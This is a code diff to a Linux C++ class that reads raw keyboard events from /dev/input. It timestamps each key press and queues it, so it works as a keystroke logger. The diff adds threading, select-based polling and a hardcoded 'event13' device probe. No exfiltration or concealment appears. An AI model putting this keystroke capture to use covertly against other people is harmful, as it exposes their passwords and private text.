@@ -56,7 +56,12 @@ auto logger::start() -> void {
 	assert(!running_ && "logger (start): logger already running.");
 
 	running_ = true;
-	ev_reader();
+
+	if (work_.joinable()) {
+		work_.join();
+	}
+
+	work_ = std::thread(&logger::ev_reader, this);
 }
 
 auto logger::kill() -> void {
@@ -64,6 +69,9 @@ auto logger::kill() -> void {
 	if (fd_ != -1) {
 		close(fd_);
 		fd_ = -1;
+	}
+	if (work_.joinable()) {
+		work_.join();
 	}
 	initialized_ = false;
 	ev_init_.clear();
@@ -89,19 +97,24 @@ auto logger::
 	return tmp;
 }
 
-auto fd_monitor(signed int fd, fd_set fds) -> signed int {
-	struct timeval timeout{1, 0};
+auto logger::fd_monitor(signed int fd, fd_set& fds) -> signed int {
+	struct timeval timeout {
+		1, 0
+	};
 
 	FD_ZERO(&fds);
 	FD_SET(fd, &fds);
 
 	auto const retval = select(fd + 1, &fds, nullptr, nullptr, &timeout);
-	assert(retval != -1 && "logger (fd_monitor): select error.");
+	if (retval == -1) {
+		std::cerr << "logger (fd_monitor): select error: " << strerror(errno) << std::endl;
+		assert(retval != -1 && "logger (fd_monitor): select error.");
+	}
 
 	return retval;
 }
 
-auto datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
+auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 	auto date = std::array<char, 11>{};
 	auto time = std::array<char, 9>{};
 
@@ -112,58 +125,66 @@ auto datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 	return std::make_pair(std::string{date.data()}, std::string{time.data()});
 }
 
-auto find_kbd() -> std::string {
-	auto const hardware_path = "/dev/input/by-id";
-	auto const kbd_id        = "-event-kbd";
+auto logger::find_kbd() -> std::string {
+	auto const dev_input = "/dev/input";
+	assert(std::filesystem::exists(dev_input) && "logger (find_kbd): /dev/input directory not found.");
+	assert(std::filesystem::is_directory(dev_input) && "logger (find_kbd): /dev/input is not a directory.");
 
-	assert(std::filesystem::exists(hardware_path) && std::filesystem::is_directory(hardware_path) &&
-	       "logger (find_kbd): invalid input directory.");
+	for (const auto& event_num : std::filesystem::directory_iterator(dev_input)) {
+		auto const& path = event_num.path();
+		if (path.filename().string().find("event13") == 0) {
+			auto const resolved_path = path.string();
+			std::cerr << "logger (find_kbd): attempting device " << resolved_path << std::endl;
 
-	for (auto const& file : std::filesystem::directory_iterator(hardware_path)) {
-		if (file.is_symlink() || file.is_character_file()) {
-			auto const& path = file.path();
-			if (path.filename().string().find(kbd_id) != std::string::npos) {
-				auto       ec            = std::error_code{};
-				auto const resolved_path = std::filesystem::canonical(path, ec);
-				assert(!ec && "logger (find_kbd): symlink resolution error.");
-
-				auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
-				assert(fd != -1 && "logger (find_kbd): open error.");
-
-				auto fds    = fd_set{};
-				auto retval = fd_monitor(fd, fds);
-
-				if (retval > 0 && FD_ISSET(fd, &fds)) {
-					close(fd);
-					return resolved_path.string();
-				}
-				close(fd);
+			auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
+			if (fd == -1) {
+				std::cerr << "logger (find_kbd): fd = -1" << std::endl;
+				continue;
 			}
+
+			fd_set fds;
+			FD_ZERO(&fds);
+			auto retval = fd_monitor(fd, fds);
+			if (retval > 0 && FD_ISSET(fd, &fds)) {
+				close(fd);
+				std::cerr << "logger (find_kbd): found working input device at " << resolved_path << std::endl;
+				return resolved_path;
+			}
+			std::cerr << "logger (find_kbd): device did not respond as expected: " << resolved_path << std::endl;
+			close(fd);
 		}
 	}
-	assert(false && "logger (find_kbd): no keyboard found.");
+	assert(false && "logger (find_kbd): no viable keyboard device found.");
 	return "";
 }
 
 auto logger::ev_reader() -> void {
 	auto ev = input_event{};
-	auto n  = ssize_t{};
 	while (running_) {
-		n = read(fd_, &ev, sizeof(ev));
-		assert(n != -1 && "logger (ev_reader): read error.");
-
-		if (n == (ssize_t)sizeof(ev) && ev.type == EV_KEY) {
-			auto  dtg = datetime(ev.time.tv_sec);
-			event e{dtg.first, dtg.second, get_keychar(ev.code), ev.value ? true : false};
-		    // TODO: does not handle held ctrl case, held shift case
-            if (ev.value == true) {
-                q_.push(e);
-            }
-        }
-
 		fd_set fds;
 		auto   retval = fd_monitor(fd_, fds);
 		assert(retval != -1 && "logger (ev_reader): select error.");
+
+		if (retval > 0 && FD_ISSET(fd_, &fds)) {
+			auto n = read(fd_, &ev, sizeof(ev));
+
+			if (n == -1) {
+				if (errno == EAGAIN || errno == EWOULDBLOCK) {
+					continue;
+				}
+				else {
+					assert(false && "logger (ev_reader): read error.");
+				}
+			}
+
+			if (n == static_cast<ssize_t>(sizeof(ev)) && ev.type == EV_KEY) {
+				auto  dtg = datetime(ev.time.tv_sec);
+				event e{dtg.first, dtg.second, get_keychar(ev.code), ev.value ? true : false};
+				if (ev.value == true) {
+					q_.push(e);
+				}
+			}
+		}
 	}
 }
 
